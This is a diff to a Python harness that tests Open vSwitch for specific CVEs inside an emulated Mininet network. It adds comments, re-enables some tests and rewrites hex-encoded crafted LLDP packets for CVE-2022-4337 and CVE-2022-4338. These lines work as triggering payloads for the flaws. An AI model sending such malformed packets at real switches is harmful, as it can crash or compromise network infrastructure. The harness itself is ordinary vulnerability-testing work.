@@ -8,6 +8,7 @@ from time import sleep
 from datetime import datetime
 from mininet_setup import MininetNetwork
 
+# Test for CVE-2016-2074
 def cve_2016_2074():
     setLogLevel('info')
 
@@ -32,6 +33,7 @@ def cve_2016_2074():
 
     return vulnerable
 
+# Test for CVE-2016-10377
 def cve_2016_10377():
     setLogLevel('info')
     os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')
@@ -64,6 +66,7 @@ def cve_2016_10377():
 
     return vulnerable
 
+# Test for CVE-2017-9264
 def cve_2017_9264():
     setLogLevel('info')
     os.system('gcc packets/cve_2017_9264.c -o packets/cve_2017_9264')
@@ -95,18 +98,23 @@ def cve_2017_9264():
 
     return vulnerable
 
+# Test for CVE-2020-27827
 def cve_2020_27827():
-    #setLogLevel('info')
+    setLogLevel('info')
 
-    #mininet = MininetNetwork()
-    #mininet.mininet_1h_1s()
+    mininet = MininetNetwork()
+    mininet.mininet_1h_1s()
 
-    #mininet.stop_mininet()
-    #mininet.cleanup_network()
+    os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
+    os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
+
+    mininet.stop_mininet()
+    mininet.cleanup_network()
 
     vulnerable = False
     return vulnerable
 
+# Test for CVE-2020-35498
 def cve_2020_35498():
     setLogLevel('info')
     os.system('gcc packets/cve_2020_35498.c -o packets/cve_2020_35498')
@@ -143,6 +151,8 @@ def cve_2020_35498():
 
     return vulnerable
 
+""""
+# Test for CVE-2021-3905 only works with dpdk
 def cve_2021_3905():
     setLogLevel('info')
 
@@ -169,7 +179,9 @@ def cve_2021_3905():
 
     vulnerable = False
     return vulnerable
+"""
 
+# Test for CVE-2022-4337
 def cve_2022_4337():
     setLogLevel('info')
 
@@ -185,7 +197,7 @@ def cve_2022_4337():
 
     #sleep(10)
 
-    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e f6 b4 26 aa 5f 00 88 cc 02 07 04 f6 b4 26 aa 5f 00 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
+    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e 00 00 00 00 00 01 88 cc 02 07 04 00 00 00 00 00 01 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
 
     mininet.stop_mininet()
 
@@ -202,6 +214,7 @@ def cve_2022_4337():
 
     return vulnerable
 
+# Test for CVE-2022-4338
 def cve_2022_4338():
     setLogLevel('info')
 
@@ -213,11 +226,13 @@ def cve_2022_4338():
     os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
     os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
 
-    #mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
+    mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
 
     #sleep(10)
 
-    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e f6 b4 26 aa 5f 00 88 cc 02 07 04 f6 b4 26 aa 5f 00 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
+    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e 00 00 00 00 00 01 88 cc 02 07 04 00 00 00 00 00 01 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
+
+    #CLI(mininet.net)
 
     mininet.stop_mininet()
 
@@ -234,6 +249,7 @@ def cve_2022_4338():
 
     return vulnerable
 
+# Test for CVE-2022-32166 OvS with ASAN is needed
 def cve_2022_32166():
     setLogLevel('info')
 
@@ -256,6 +272,7 @@ def cve_2022_32166():
     
     return vulnerable
 
+# Test for CVE-2023-1668
 def cve_2023_1668():
     setLogLevel('info')
     os.system('gcc packets/cve_2023_1668.c -o packets/cve_2023_1668')
@@ -302,5 +319,5 @@ def cve_2023_1668():
 
 # This is for testing purposes:
 if __name__ == '__main__':
-    test = cve_2021_3905()
+    test = cve_2022_4338()
     print(test)
